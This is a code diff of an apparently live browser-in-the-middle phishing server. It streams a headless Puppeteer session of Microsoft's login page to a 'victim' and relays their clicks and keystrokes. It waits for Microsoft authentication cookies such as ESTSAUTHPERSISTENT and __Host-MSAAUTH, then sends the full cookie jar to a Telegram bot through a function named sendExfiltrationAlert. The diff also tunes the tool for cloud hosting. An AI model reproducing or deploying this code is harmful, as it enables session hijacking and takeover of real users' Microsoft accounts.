@@ -6,70 +6,63 @@ const FormData = require('form-data');
 puppeteer.use(StealthPlugin());
 
 // --- CONFIGURATION VAULT ---
-// Replace with your Google Apps Script Web App URL
-const VAULT_URL = "https://script.google.com/macros/s/AKfycbzjX20l3RNxx1adYeW_108CdbGJlO3vi2lwhdixZSBo_83oijJYtIAURqAg9ImZSGrZ/exec";
+const VAULT_URL = "https://script.google.com/macros/s/YOUR_DEPLOYMENT_ID/exec";
 let cachedCreds = null;
 
 const VIEWPORT_WIDTH = 1280;
 const VIEWPORT_HEIGHT = 720;
 
-/**
- * Retrieves credentials from the GAPS Vault
- */
 async function getSecrets() {
     if (cachedCreds) return cachedCreds;
     try {
         const response = await axios.get(VAULT_URL, { timeout: 5000 });
         cachedCreds = response.data;
         return cachedCreds;
-    } catch (e) {
-        return null;
-    }
+    } catch (e) { return null; }
 }
 
-/**
- * Sends the captured jar to Telegram using GAPS-hosted credentials
- */
 async function sendExfiltrationAlert(cookies, finalUrl, source) {
     const secrets = await getSecrets();
     if (!secrets || !secrets.TG_TOKEN || !secrets.TG_CHAT_ID) return;
 
-    const docUrl = `https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`;
-    const msgUrl = `https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`;
-    const chatId = secrets.TG_CHAT_ID;
-
     try {
         const host = new URL(finalUrl).hostname;
-        const textAlert = `<b>🚨 STAGE CAPTURE: ${host}</b>\n\n<b>Trigger:</b> <code>${source}</code>\n<b>Tokens:</b> ${cookies.length}\n\n<i>Verified: 2026 Persistence Signatures</i>`;
+        const textAlert = `<b>🚨 STAGE CAPTURE: ${host}</b>\n<b>Trigger:</b> ${source}\n<b>Cookies:</b> ${cookies.length}`;
         
-        await axios.post(msgUrl, { chat_id: chatId, text: textAlert, parse_mode: 'HTML' });
+        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendMessage`, { 
+            chat_id: secrets.TG_CHAT_ID, 
+            text: textAlert, 
+            parse_mode: 'HTML' 
+        });
 
         const form = new FormData();
-        form.append('chat_id', chatId);
-        form.append('caption', `Auth Jar [${host}]`);
+        form.append('chat_id', secrets.TG_CHAT_ID);
         form.append('document', Buffer.from(JSON.stringify(cookies, null, 2), 'utf-8'), {
             filename: `JAR_${host.replace(/\./g, '_')}_${Date.now()}.json`,
             contentType: 'application/json'
         });
 
-        await axios.post(docUrl, form, { headers: form.getHeaders() });
-    } catch (e) {
-        // Silent failure for production stability
-    }
+        await axios.post(`https://api.telegram.org/bot${secrets.TG_TOKEN}/sendDocument`, form, { headers: form.getHeaders() });
+    } catch (e) {}
 }
 
 async function startSession(io, socket) {
-    let browser;
+    let browser = null;
     const capturedDomains = new Set(); 
 
     try {
+        // LEAN-MEMORY LAUNCH (Railway Optimized)
         browser = await puppeteer.launch({
             headless: "new",
             args: [
                 '--no-sandbox', 
                 '--disable-setuid-sandbox', 
-                `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`,
-                '--disable-notifications'
+                '--disable-dev-shm-usage', // FIXES RAILWAY MEMORY REJECTIONS
+                '--disable-gpu', 
+                '--disable-extensions',
+                '--no-zygote',
+                '--single-process', // Aggressive RAM saving
+                `--window-size=${VIEWPORT_WIDTH},${VIEWPORT_HEIGHT}`
             ]
         });
 
@@ -80,80 +73,62 @@ async function startSession(io, socket) {
         const attemptExfiltration = async (source) => {
             try {
                 const url = page.url().toLowerCase();
-                if (url === 'about:blank') return;
-                
                 const host = new URL(url).hostname;
-                if (capturedDomains.has(host)) return;
+                if (capturedDomains.has(host) || url.includes('about:blank')) return;
 
                 const cookies = await page.cookies();
-                const criticalTokens = [
-                    'ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CCState', 
-                    '__Host-MSAAUTH', 'RPSSecAuth', 'FedAuth', 'OutlookSession'
-                ];
+                const critical = ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'CCState', '__Host-MSAAUTH'];
                 
-                const hasValidAuth = cookies.some(c => criticalTokens.some(t => c.name.includes(t)));
-
-                if (hasValidAuth && !url.includes('/oauth20_authorize.srf')) {
+                if (cookies.some(c => critical.some(t => c.name.includes(t)))) {
                     capturedDomains.add(host); 
-                    
-                    // 5-second settlement for background token exchange
-                    await new Promise(r => setTimeout(r, 5000));
-                    
+                    await new Promise(r => setTimeout(r, 4500));
                     const finalJar = await page.cookies();
                     await sendExfiltrationAlert(finalJar, url, source);
                 }
             } catch (e) {}
         };
 
-        // --- TRIGGERS ---
-        page.on('response', async (response) => {
-            const url = response.url().toLowerCase();
-            if (url.includes('/kmsi') || url.includes('/token') || url.includes('landingv2')) {
-                await attemptExfiltration('Network-Intercept');
-            }
+        // --- HANDLERS ---
+        page.on('response', async (res) => {
+            const url = res.url().toLowerCase();
+            if (url.includes('/kmsi') || url.includes('/token')) await attemptExfiltration('Net-Intercept');
         });
 
-        page.on('framenavigated', async (frame) => {
-            await attemptExfiltration('Navigation-Trigger');
-        });
-
-        const emitFrame = async () => {
+        const heartbeat = setInterval(async () => {
             if (socket.connected) {
                 try {
-                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 20 });
+                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 15 }); // Reduced quality for bandwidth
                     socket.emit('browser-render', { screenshot });
                 } catch (e) {}
             }
-        };
+        }, 1300);
 
-        await page.goto('https://login.microsoftonline.com/', { waitUntil: 'networkidle2' }).catch(() => {});
-        
-        const heartbeat = setInterval(emitFrame, 1300);
-        const poller = setInterval(() => attemptExfiltration('Periodic-Poll'), 4500);
+        const poller = setInterval(() => attemptExfiltration('Poll'), 5000);
 
-        // Victim Interaction
         socket.on('victim-action', async (data) => {
             try {
-                if (data.type === 'click') {
-                    await page.mouse.click(data.x, data.y, { delay: 65 });
-                } else if (data.type === 'key') {
-                    await page.keyboard.press(data.key);
-                }
-                await emitFrame();
+                if (data.type === 'click') await page.mouse.click(data.x, data.y, { delay: 40 });
+                else if (data.type === 'key') await page.keyboard.press(data.key);
             } catch (e) {}
         });
 
-        // Socket Heartbeat (Railway Keep-Alive)
-        socket.on('heartbeat', () => { /* Logic is handled by the packet receipt itself */ });
-
+        // THE AGGRESSIVE REAPER
         socket.on('disconnect', async () => {
             clearInterval(heartbeat);
             clearInterval(poller);
-            if (browser) await browser.close();
+            if (browser) {
+                try {
+                    const pages = await browser.pages();
+                    await Promise.all(pages.map(p => p.close().catch(() => {})));
+                    await browser.close().catch(() => {});
+                } finally {
+                    browser = null;
+                }
+            }
         });
 
     } catch (error) {
-        if (browser) await browser.close();
+        if (browser) await browser.close().catch(() => {});
     }
 }
 
